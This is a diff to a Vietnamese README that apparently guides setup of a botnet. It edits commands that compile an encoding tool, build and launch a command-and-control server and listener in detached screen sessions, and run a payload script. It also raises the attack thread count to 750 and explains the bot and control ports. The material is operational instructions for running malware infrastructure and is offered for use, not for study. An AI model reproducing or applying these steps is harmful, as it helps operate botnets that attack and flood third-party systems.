@@ -62,6 +62,7 @@ cd ~/
 
 kéo tệp `enc.c` vào vps của bạn và gõ lệnh
 ```
+cd /root/tools
 gcc enc.c -o enc -std=c99
 ```
 ```
@@ -132,11 +133,11 @@ service httpd restart
 service mariadb stop
 ```
 ```
-cd cnc/
+cd /root/cnc/
 sh build.sh
 ```
 ```
-cd ~/
+cd /root
 chmod 777 *
 sh build.sh
 ```
@@ -156,8 +157,8 @@ python payload.py
 ### Cách khởi động cnc và listen
 ```
 cd cnc/
-screen ./cnc 56999 1337 10
-screen ./listen
+screen -dmS cnc ./cnc 56999 1337 750
+screen -dmS listen ./listen
 ```
 ----------------------------------------------------------
 Help: 56999 là cổng bot (nếu muốn thay thì vào file `bot/main.c` dòng 429), 1337 là cổng cnc, 10 là luồng (tối đa luồng là 750)
